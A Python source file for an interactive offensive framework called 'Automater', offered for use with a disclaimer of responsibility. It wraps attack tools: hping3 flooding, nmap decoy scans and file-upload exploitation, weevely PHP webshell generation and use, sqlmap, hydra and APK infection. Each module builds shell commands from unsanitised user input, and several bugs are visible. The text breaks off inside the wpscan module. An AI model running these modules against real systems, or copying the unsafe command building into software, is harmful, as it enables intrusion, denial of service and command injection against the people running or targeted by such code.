import subprocess
import random
import os

def welcome():
    var = random.randint(0,4)
    val = random.randint(0,4)
    if val == 0:
        frase = "\"si vis pacem para bellum\""
        frase1 = "Ancient Roman saying (If you want peace, prepare for war)"
    elif val == 1:
        frase = "\"Veni, vidi, vici\""
        frase1 = "Julius Caesar (I came, I saw, I conquered)"
    elif val == 2:
        frase = "\"Two things are infinite: the universe and human stupidity, but I still have doubts about the universe\""
        frase1 = "Albert Einstein"
    elif val == 3:
        frase = "\"A computer is like air conditioning. It become useless when you open Windows\""
        frase1 = "Linus Torvalds"
    else:
        frase = "\"We have problems with our physical security, operational security through to management\""
        frase1 = "Kevin Mitnick"
    if var == 0:
        print("    _         _                        _            ")
        print("   / \  _   _| |_ ___  _ __ ___   __ _| |_ ___ _ __ ", frase)
        print("  / _ \| | | | __/ _ \| '_ ` _ \ / _` | __/ _ \ '__|", frase1)
        print(" / ___ \ |_| | || (_) | | | | | | (_| | ||  __/ |    v.2.4.0")
        print("/_/   \_\__,_|\__\___/|_| |_| |_|\__,_|\__\___|_|    By @gasmat")
        print()
    if var == 1:
        print("   #                                                          ")
        print("  # #   #    # #####  ####  #    #   ##   ##### ###### #####  ")
        print(" #   #  #    #   #   #    # ##  ##  #  #    #   #      #    # ")
        print("#     # #    #   #   #    # # ## # #    #   #   #####  #    # ", frase)
        print("####### #    #   #   #    # #    # ######   #   #      #####  ", frase1)
        print("#     # #    #   #   #    # #    # #    #   #   #      #   #   v.2.4.0")
        print("#     #  ####    #    ####  #    # #    #   #   ###### #    #  By @gasmat")
    if var == 2:
        print("               _                        _            ")
        print("    /\        | |                      | |           ")
        print("   /  \  _   _| |_ ___  _ __ ___   __ _| |_ ___ _ __ ", frase)
        print("  / /\ \| | | | __/ _ \| '_ ` _ \ / _` | __/ _ \ '__|", frase1)
        print(" / ____ \ |_| | || (_) | | | | | | (_| | ||  __/ |    v.2.4.0")
        print("/_/    \_\__,_|\__\___/|_| |_| |_|\__,_|\__\___|_|    By @gasmat")
    if var == 3:
        print("    \          |                         |            ", frase)
        print("   _ \   |   | __|  _ \  __ `__ \   _` | __|  _ \  __|",frase1)
        print("  ___ \  |   | |   (   | |   |   | (   | |    __/ |    v.2.4.0")
        print("_/    _\\\__,_|\__|\___/ _|  _|  _|\__,_|\__|\___|_|    By @gasmat ")
    if var == 4:
        print("   _       _                  _           ", frase)
        print("  /_\ _  _| |_ ___ _ __  __ _| |_ ___ _ _ ", frase1)
        print(" / _ \ || |  _/ _ \ '  \/ _` |  _/ -_) '_| v.2.4.0")
        print("/_/ \_\_,_|\__\___/_|_|_\__,_|\__\___|_|   By @gasmat")

def help():
    welcome()
    print("This is an automated framework for newbie and for lazy people")
    print("I AM NOT RESPONSIBLE FOR THE USE YOU WILL HAVE WITH MY PROJECT!")
    print()
    print("COMMAND              DESCRIPTION")
    print("help                 Show this help message")
    print("list all             List all tool")
    print("use <MODULE>         Use the selected module")
    print("ip                   Get your internal and external ip address")
    print("update               Update the tools")
    print("clear                Clear the screen")
    print("exit                 Exit the framework")

def list_all():
    print()
    print("Information gathering:")
    print("\tmetagoofil         Collects gathering metadata")
    print("\twhois              Provide names, physical address, phone number, etc... of a domain")
    print("\tdeep magic         Set of tools for information gathering")
    print("\thping3             Detect if the target is alive")
    print("Scanner:")
    print("\tnmap               Most used port scanner")
    print("\tnikto              Make a vulnerability scanner")
    print("\twafw00f            Scan for web application firewall")
    print("\tlbd                Scan for Load Balancer")
    print("Website:")
    print("\tweevely            Generate and run webshell for website")
    print("\twpscan             Find and exploit wordpress vulnerabilities")
    print("\thttrack            Clone a website")
    print("Database:")
    print("\tsqlmap             Detect and exploit sql injection")
    print("Exploit:")
    print("\tkwetza             Infect an existing apk")
    print("Password:")
    print("\thydra              Password cracker for most protocols")
    print("\tcupp               Generate password list")
    print("Wi-Fi:")
    print("\taircrack-ng        Tool from the aircrack-ng suite")

def update():
    welcome()
    print("[+] Updating repository...")
    subprocess.run("sudo apt update", shell=True)
    print("[+] Updating metagoofil...")
    subprocess.run("sudo apt install -y metagoofil", shell=True)
    print("[+] Updating whois...")
    subprocess.run("sudo apt install -y whois", shell=True)
    print("[+] Updating deep magic...")
    subprocess.run("sudo apt install -y dmitry")
    print("[+] Updating hping3...")
    subprocess.run("sudo apt install -y hping3", shell=True)
    print("[+] Updating nmap...")
    subprocess.run("sudo apt install -y nmap", shell=True)
    print("[+] Updating nikto...")
    subprocess.run("sudo apt install -y nikto", shell=True)
    print("[+] Updating wafw00f...")
    subprocess.run("sudo apt install -y wafw00f", shell=True)
    print("[+] Updating lbd...")
    subprocess.run("sudo apt install -y lbd", shell=True)
    print("[+] Updating weevely...")
    subprocess.run("sudo apt install -y weevely", shell=True)
    print("[+] Updating wpscan...")
    subprocess.run("sudo apt install -y wpscan", shell=True)
    print("[+] Updating httrack...")
    subprocess.run("sudo apt install -y httrack", shell=True)
    print("[+] Updating sqlmap...")
    subprocess.run("sudo apt install -y sqlmap", shell=True)
    print("[+] Updating hydra...")
    subprocess.run("sudo apt install -y hydra", shell=True)
    print("[+] Updating aircrack-ng...")
    subprocess.run("sudo apt install -y aircrack-ng", shell=True)
    print("[+] Updating tor...")
    subprocess.run("sudo apt install -y tor", shell=True)

def clear():
    subprocess.run("clear", shell=True)

def use():
    module1 = command.replace("use ", "")
    module = module1.replace(" ", "")
    if module == "metagoofil":
        metagoofil()
    if module == "whois":
        whois()
    if module == "deepmagic":
        deep_magic()
    if module == "hping3":
        hping3()
    if module == "nmap":
        nmap()
    if module == "nikto":
        nikto()
    if module == "wafw00f":
        wafw00f()
    if module == "lbd":
        lbd()
    if module == "weevely":
        weevely()
    if module == "wpscan":
        wpscan()
    if module == "httrack":
        httrack()
    if module == "sqlmap":
        sqlmap()
    if module == "kwetza":
        kwetza()
    if module == "hydra":
        hydra()
    if module == "cupp":
        cupp()
    if module == "aircrack-ng":
        aircrack_ng()

def ip():
    print("----------------INTERNAL IP----------------")
    subprocess.run("sudo ifconfig", shell=True)
    print("----------------EXTERNAL IP----------------")
    subprocess.run("sudo curl ipecho.net/plain ; echo", shell=True)

def metagoofil(): 
    print("You have chosen the module: metagoofil")
    domain = ""
    file0 = ""
    while True:
        command = str(input("#metagoofil>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module collects information (file), and shows: owner the creation date, etc...")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "domain" in module:
                domain = module.replace("domain", "")
                print("domain ==>", domain)
            if "file" in module:
                file0 = module.replace("file", "")
                print("file ==>", file0)
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("domain       yes        ", domain)
            print("file         yes        ", file0)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "metagoofil -d " + domain + " -t " + file0
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: metagoofil")
            break

def deep_magic(): 
    print("You have chosen the module: deep magic")
    domain = ""
    while True:
        command = str(input("#deep magic>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This all-in-one tool include some of the most important tool (whois, netcraft, ecc...) for information gathering")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTION       REQUIRED    CURRENT VALUE")
            print("domain       yes        ", domain)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "domain" in module:
                domain = module.replace("domain", "")
                print("domain ==>", domain)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "dmitry -winsepfb " + domain
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: deep magic")
            break

def whois():
    print("You have chosen the module: whois")
    domain = ""
    verbose = False
    vverbose = "no"
    while True:
        command = str(input("#whois>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This tool provide names, physical address, phone number, etc... of a given domain")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTION       REQUIRED    CURRENT VALUE")
            print("domain       yes        ", domain)
            print("verbose      no         ", vverbose)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "domain" in module:
                domain = module.replace("domain", "")
                print("domain ==>", domain)
            if "verbose" in module:
                vverbose = module.replace("verbose", "")
                if vverbose == "yes" or vverbose == "no":
                    print("verbose ==>", vverbose)
                    if vverbose == "yes":
                        verbose = True
                    else:
                        verbose = False
                else:
                    print("The option verbose can be only yes or no")
                    vverbose = "no"
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "whois " + domain + " "
            if verbose == True:
                shell1 += "--verbose"
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: whois")
            break

def hping3(): 
    print("You have chosen the module: hping3")
    interface = ""
    target = ""
    mode = ""
    vmode = ""
    flood = False
    vflood = "no"
    verbose = False
    vverbose = "no"
    while True:
        command = str(input("#hping3>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module check if target is alive")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTION       REQUIRED    CURRENT VALUE")
            print("interface    yes        ", interface)
            print("target       yes        ", target)
            print("mode         yes        ", mode, "(must be: raw ip, icmp, udp)")
            print("flood        no         ", vflood, "(Warning: you can damage the target machine)")
            print("verbose      no         ", vverbose)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "interface" in module:
                interface = module.replace("interface", "")
                print("interface ==>", interface)
            if "target" in module:
                target = module.replace("target", "")
                print("target ==>", target)
            if "mode" in module:
                mode = module.replace("mode", "")
                if mode == "rawip" or mode == "icmp" or mode == "udp":
                    print("mode ==>", mode)
                else:
                    print("Invalid mode!")
                    mode = ""
            if "flood" in module:
                vflood = module.replace("flood", "")
                if vflood == "yes" or vflood == "no":
                    print("flood ==>", vflood)
                    if vflood == "yes":
                        flood = True
                    else:
                        flood = False
                else:
                    print("The option flood can be only yes or no")
                    vflood = "no"
            if "verbose" in module:
                vverbose = module.replace("verbose", "")
                if vverbose == "yes" or vverbose == "no":
                    print("verbose ==>", vverbose)
                    if vverbose == "yes":
                        verbose = True
                    else:
                        verbose = False
                else:
                    print("The option verbose can be only yes or no")
                    vverbose = "no"
        if command.startswith("execute") or command.endswith("execute"):
            if mode == "raw ip":
                vmode = "0"
            elif mode == "icmp":
                vmode = "1"
            elif mode == "udp":
                vmode = "2"
            shell1 = "hping3 -" + vmode + " -I " + interface + " " + target
            if verbose == True:
                shell1 += " -V"
            if flood == True:
                shell1 += " --flood"
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: hping3")
            break

def nmap():
    print("You have chosen the module: nmap")
    while True:
        command = str(input("#nmap>>>"))
        if command.startswith("help") or command.endswith("help"):
            print()
            print("This tool generate a webshell for website that use PHP.")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("vulner       Scan for vulnerabilities")
            print("bypass       Bypass firewall")
            print("detect       Detect firewall with ACK probe")
            print("file upload  Exploits insecure file upload forms in web applications ")
            print("upload       Uploads a local file to a remote web server ")
        if "use" in command:
            module1 = command.replace("use", "")
            module = module1.replace(" ", "")
            if "vulner" in module:
                print("You have chosen the module: vulner")
                target = ""
                service = True
                sservice = "yes"
                verbose = False
                vverbose = "no"
                while True:
                    command1 = str(input("#nmap/vulner>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print("The numbers indicate the severity of the vulnerability")
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the nmap menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("target       yes        ", target)
                        print("service      no         ", sservice)
                        print("verbose      no         ", vverbose)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "target" in module:
                            target = module.replace("target", "")
                            print("target ==>", target)
                        if "service" in module:
                            sservice = module.replace("service", "")
                            if sservice == "yes" or sservice == "no":
                                print("service ==>", sservice)
                                if sservice == "yes":
                                    service = True
                                else:
                                    service = False
                            else:
                                print("The option service can be only yes or no")
                        if "verbose" in module:
                            vverbose = module.replace("verbose", "")
                            if vverbose == "yes" or vverbose == "no":
                                print("verbose ==>", vverbose)
                                if vverbose == "yes":
                                    verbose = True
                                else:
                                    verbose = False
                            else:
                                print("The option verbose can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "nmap "
                        if verbose == True:
                            shell1 += "-v "
                        if service == True:
                            shell1 += "-sV "
                        shell1 += "--script vulner "
                        shell1 += target
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: vulner")
                        break
            if "bypass" in module:
                print("You have chosen the module: bypass")
                target = ""
                decoy = "random"
                service = True
                sservice = "yes"
                fast = True
                ffast = "yes"
                verbose = False
                vverbose = "no"
                while True:
                    command1 = str(input("#nmap/bypass>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the nmap menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("target       yes        ", target)
                        print("decoy        no         ", decoy, "(the ip to spoof)")
                        print("service      no         ", sservice)
                        print("fast         no         ", ffast)
                        print("verbose      no         ", vverbose)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "target" in module:
                            target = module.replace("target", "")
                            print("target ==>", target)
                        if "decoy" in module:
                            decoy = module.replace("decoy", "")
                            print("decoy ==>", decoy)
                        if "service" in module:
                            sservice = module.replace("service", "")
                            if sservice == "yes" or sservice == "no":
                                print("service ==>", sservice)
                                if sservice == "yes":
                                    service = True
                                else:
                                    service = False
                            else:
                                print("The option service can be only yes or no")
                        if "fast" in module:
                            ffast = module.replace("fast", "")
                            if ffast == "yes" or ffast == "no":
                                print("fast ==>", ffast)
                                if ffast == "yes":
                                    fast = True
                                else:
                                    fast = False
                            else:
                                print("The option fast can be only yes or no")
                        if "verbose" in module:
                            vverbose = module.replace("verbose", "")
                            if vverbose == "yes" or vverbose == "no":
                                print("verbose ==>", vverbose)
                                if vverbose == "yes":
                                    verbose = True
                                else:
                                    verbose = False
                            else:
                                print("The option verbose can be only yes or no")
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "nmap -sS "
                        if service == True:
                            shell1 += "-sV "
                        if verbose == True:
                            shell1 += "-v "
                        if fast == True:
                            shell1 += "-F "
                        if decoy == "random":
                            shell1 += "-D RND "
                        else:
                            shell1 += "-D "
                            shell1 += decoy
                        shell1 += target
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: bypass")
                        break
            if "detect" in module:
                print("You have chosen the module: detect")
                target = ""
                while True:
                    command1 = str(input("#nmap/detect>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print("If you get print filtered the target has firewall and if you get print unfiltered the target hasn't got a firewall")
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the nmap menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("target       yes        ", target)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "target" in module:
                            target = module.replace("target", "")
                            print("target ==>", target)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "nmap -sA " + target + " --reason"
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: detect")
                        break
            if "fileupload" in module:
                print("You have chosen the module: file upload")
                target = ""
                port = "80"
                while True:
                    command1 = str(input("#nmap/file upload>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print("Exploits insecure file upload forms in web applications using various techniques")
                        print("like changing the Content-type header or creating valid image files containing the payload in the comment.")
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the nmap menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("target       yes        ", target)
                        print("port         no         ", port)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "target" in module:
                            target = module.replace("target", "")
                            print("target ==>", target)
                        if "port" in module:
                            port = module.replace("port", "")
                            print("port ==>", port)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "nmap -p" + port + " " + target + " --script http-fileupload-exploiter.nse " + target
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: file upload")
                        break
            if "upload" in module:
                print("You have chosen the module: upload")
                target = ""
                port = "80"
                file0  = ""
                directory = ""
                while True:
                    command1 = str(input("#nmap/upload>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the nmap menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("target       yes        ", target)
                        print("port         no         ", port)
                        print("file         yes        ", file0 , "(The full path to the local file that should be uploaded to the server)")
                        print("directory    yes        ", directory, "(The remote directory and filename to store the file to e.g. (/uploads/file.txt))")
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "target" in module:
                            target = module.replace("target", "")
                            print("target ==>", target)
                        if "port" in module:
                            port = module.replace("port", "")
                            print("port ==>", port)
                        if "file" in module:
                            file0 = module.replace("file", "")
                            print("file ==>", file0)
                        if "directory" in module:
                            directory = module.replace("directory", "")
                            print("directory ==>", directory)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "nmap -p" + port + " " + target + " --script http-put --script-args http-put.url='" + directory + "',http-put.file='" + file0 + "'"
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: upload")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: nmap")
            break

def nikto(): 
    print("You have chosen the module: nikto")
    target = ""
    port = "80"
    while True:
        command = str(input("#nikto>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a scan of the target with the aim of finding vulnerabilities")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTION       REQUIRED    CURRENT VALUE")
            print("target       yes        ", target)
            print("port         no         ", port)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "target" in module:
                target = module.replace("target", "")
                print("target ==>", target)
            if "port" in module:
                port = module.replace("port", "")
                print("port ==>", port)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "nikto -host " + target + " -port " + port
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: nikto")
            break

def wafw00f(): 
    print("You have chosen the module: wafw00f")
    domain = ""
    verbose = False
    vverbose = "no"
    listall = False
    vlistall = "no"
    while True:
        command = str(input("#wafw00f>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module scan a domain with the aim of find a Web Application Firewall (WAF)")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("domain       yes        ", domain)
            print("list all     no         ", vlistall)
            print("verbose      no         ", vverbose)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "domain" in module:
                domain = module.replace("domain", "")
                print("domain ==>", domain)
            if "listall" in module:
                vlistall = module.replace("listall", "")
                if vlistall == "yes" or vlistall == "no":
                    print("list all ==>", vlistall)
                    if vlistall == "yes":
                        listall = True
                    else:
                        listall = False
                else:
                    print("The option list all can be only yes or no")
            if "verbose" in module:
                vverbose = module.replace("verbose", "")
                if vverbose == "yes" or vverbose == "no":
                    print("verbose ==>", vverbose)
                    if vverbose == "yes":
                        verbose = True
                    else:
                        verbose = False
                else:
                    print("The option verbose can be only yes or no")
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "wafw00f "
            if verbose == True:
                shell1 += "-v "
            if listall == True:
                shell1 += "-a "
            shell1 += domain
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: wafw00f")
            break

def lbd():
    print("You have chosen the module: lbd")
    domain = ""
    port = ""
    while True:
        command = str(input("#lbd>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("Checks if a given domain uses load-balancer")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow options       Show the options to set")
            print("\tset <OPTION>       Set the value of the <OPTION>")
            print("\texecute            Start the tool")
            print("\tback               Go back to the main menu")
        if command.startswith("show options") or command.endswith("show options"):
            print("OPTIONS      REQUIRED    CURRENT VALUE")
            print("domain       yes        ", domain)
            print("port         no         ", port)
        if "set" in command:
            module1 = command.replace("set", "")
            module = module1.replace(" ", "")
            if "domain" in module:
                domain = module.replace("domain", "")
                print("domain ==>", domain)
            if "port" in module:
                port = module.replace("port", "")
                print("port ==>", port)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "lbd " + domain + " " + port
            try:
                print("[+] Running command:", shell1)
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: lbd")
            break

def weevely():
    print("You have chosen the module: weevely")
    while True:
        command = str(input("#weevely>>>"))
        if command.startswith("help") or command.endswith("help"):
            print()
            print("This tool generate a webshell for website that use PHP.")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("generate     Generate the shell")
            print("run          Run the shell")
        if "use" in command:
            module1 = command.replace("use", "")
            module = module1.replace(" ", "")
            if module == "generate":
                print("You have chosen the module: generate")
                password = ""
                file0 = ""
                while True:
                    command1 = str(input("#weevely/generate>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("password     yes        ", password)
                        print("file         yes        ", file0, "(must finish with .php")
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "password" in module:
                            password = module.replace("password", "")
                            print("password ==>", password)
                        if "file" in module:
                            file0 = module.replace("file", "")
                            print("file ==>", file0)
                    if command1.startswith("execute") or command1.endswith("execute"):
                        shell1 = "weevely generate " + password + " " + file0
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: generate")
                        break
            if module == "run":
                print("You have chosen the module: run")
                url = ""
                password = ""
                while True:
                    command1 = str(input("#weevely/run>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
                        print("\tCOMMAND            DESCRIPTION")
                        print("\thelp               Show this help message")
                        print("\tshow options       Show the options to set")
                        print("\tset <OPTION>       Set the value of the <OPTION>")
                        print("\texecute            Start the module")
                        print("\tback               Go back to the weevely menu")
                    if command1.startswith("show options") or command1.endswith("show options"):
                        print("OPTIONS      REQUIRED    CURRENT VALUE")
                        print("url          yes        ", url, "(the URL of the uploaded shell)")
                        print("password     yes        ", password)
                    if "set" in command1:
                        module1 = command1.replace("set", "")
                        module = module1.replace(" ", "")
                        if "url" in module:
                            url = module.replace("url", "")
                            print("url ==>", url)
                        if "password" in module:
                            password = module.replace("password", "")
                            print("password ==>", password)
                    if command1.startswith("execute") or command.endswith("execute"):
                        shell1 = "weevely " + url + " " + password
                        try:
                            print("[+] Running command:", shell1)
                            subprocess.run(shell1, shell=True)
                        except:
                            print("There is some trouble...")
                            print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                            print("Are you running this script on Linux?")
                    if command1.startswith("back") or command1.endswith("back"):
                        print("Exiting from module: run")
                        break
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: weevely")
            break

def wpscan():
    print("You have chosen the module: wpscan")
    while True:
        command = str(input("#wpscan>>>"))
        if command.startswith("help") or command.endswith("help"):
            print()
            print("This tool find and exploit vulnerabilities of wordpress website and blog.")
            print()
            print("\tCOMMAND            DESCRIPTION")
            print("\thelp               Show this help message")
            print("\tshow modules       Show the modules")
            print("\tuse <MODULE>       Use a module")
            print("\tback               Go back to the main menu")
        if command.startswith("show modules") or command.endswith("show modules"):
            print("MODULE       DESCRIPTION")
            print("scan         Scan for vulnerabilities")
            print("usernameuse  user")
            print("bruteforce   Bruteforce the user's password")
        if "use" in command:
            module = command.replace("use ", "")
            if module == "scan":
                print("You have chosen the module: scan")
                url = ""
                while True:
                    command1 = str(input("#wpscan/scan>>>"))
                    if command1.startswith("help") or command1.endswith("help"):
                        print()
